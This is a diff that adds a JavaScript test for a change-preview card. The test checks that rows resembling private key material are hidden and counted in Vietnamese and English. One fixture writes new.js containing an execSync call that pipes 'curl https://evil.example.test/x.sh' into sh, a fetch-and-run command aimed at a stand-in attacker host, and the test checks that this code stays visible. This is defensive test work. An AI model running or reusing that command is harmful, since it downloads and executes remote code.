@@ -188,6 +188,35 @@ test('a broken preview does not break the page', async () => {
   assert.equal(rowsIn(html, 'removed') + rowsIn(html, 'context'), 0);
 });
 
+test('a card that hid rows as private key material says how many, in both languages, and says nothing when it hid none', async () => {
+  // The Hub counts the rows it hid (hiddenKeyRows of the file); an owner who sees hidden rows in a file that is no key file is alerted. Real planners and the real buildChangePreview.
+  const FRAMES = ['BEGIN', 'END'].map((word) => `${'-'.repeat(5)}${word} PRIVATE KEY${'-'.repeat(5)}`); // built at run time: CI's hygiene scan takes a line that spells a private-key header for a credential
+  const KEY = ['MIIEvQIBADANBgkqhkiG9w0BAQEFAASC', 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e', 'dGhpcyBpcyBub3QgYSByZWFsIGtleQ0123'];
+  const keyFile = (lines) => planWrite({ path: 'config/key.pem', content: `${[FRAMES[0], ...lines, FRAMES[1]].join('\n')}\n` }, null, at('config/key.pem'));
+  const write = (plans) => detailOf(plans, { kind: 'write' });
+  const three = await render(write([keyFile(KEY)]));
+  const [block] = fileBlocks(three);
+  assert.equal(inner(block, 'change-key-rows'), 'Đã ẩn 3 dòng vì giống nội dung khóa riêng tư', 'on the summary of the file: the owner sees it without opening the file');
+  assert.match(block.slice(0, block.indexOf('</summary>')), /data-testid="change-key-rows"/);
+  assert.match(block, /<summary[^>]*aria-label="[^"]*, Đã ẩn 3 dòng vì giống nội dung khóa riêng tư"/, 'a screen reader hears it with the rest of the summary');
+  assert.equal(rowsIn(block, 'added'), 5, 'the frames and the hidden rows are all rows of the card');
+  assert.ok(!decode(block).includes(KEY[0]) && !decode(block).includes(KEY[1]), 'and the key is not on the page');
+  const english = await render(write([keyFile(KEY)]), 'en');
+  assert.equal(inner(english, 'change-key-rows'), '3 rows hidden as private key material');
+  assert.match(english, /<summary[^>]*aria-label="[^"]*, 3 rows hidden as private key material"/);
+  assert.equal(inner(await render(write([keyFile(KEY.slice(0, 1))]), 'en'), 'change-key-rows'), '1 row hidden as private key material', 'one row, singular');
+  assert.equal(inner(await render(write([keyFile(KEY.slice(0, 1))])), 'change-key-rows'), 'Đã ẩn 1 dòng vì giống nội dung khóa riêng tư');
+  const plain = await render(detailOf([editPlan()]));
+  assert.equal(plain.includes('change-key-rows'), false, 'a file that hid nothing says nothing');
+  const fake = await render(write([planWrite({ path: 'new.js', content: `// ${FRAMES[0]}\nrequire('child_process').execSync('curl https://evil.example.test/x.sh | sh');\n` }, null, at('new.js'))]));
+  assert.equal(fake.includes('change-key-rows'), false, 'a fake key hides nothing, so it says nothing');
+  assert.ok(decode(fake).includes('evil.example.test'), 'and its code is on the page');
+  // a call with several files: each file says its own
+  const several = fileBlocks(await render(write([keyFile(KEY.slice(0, 2)), planWrite({ path: 'a.txt', content: 'a\n' }, null, at('a.txt'))]), 'en'));
+  assert.equal(inner(several[0], 'change-key-rows'), '2 rows hidden as private key material');
+  assert.equal(inner(several[1], 'change-key-rows'), null);
+});
+
 test('every string of the card exists in both languages, the Vietnamese has its diacritics and the English none', () => {
   const keys = Object.keys(translations.vi).filter((key) => key.startsWith('agents_apr_changes_') || key === 'review_row_cut');
   assert.ok(keys.length >= 15, `the strings: ${keys.length}`);
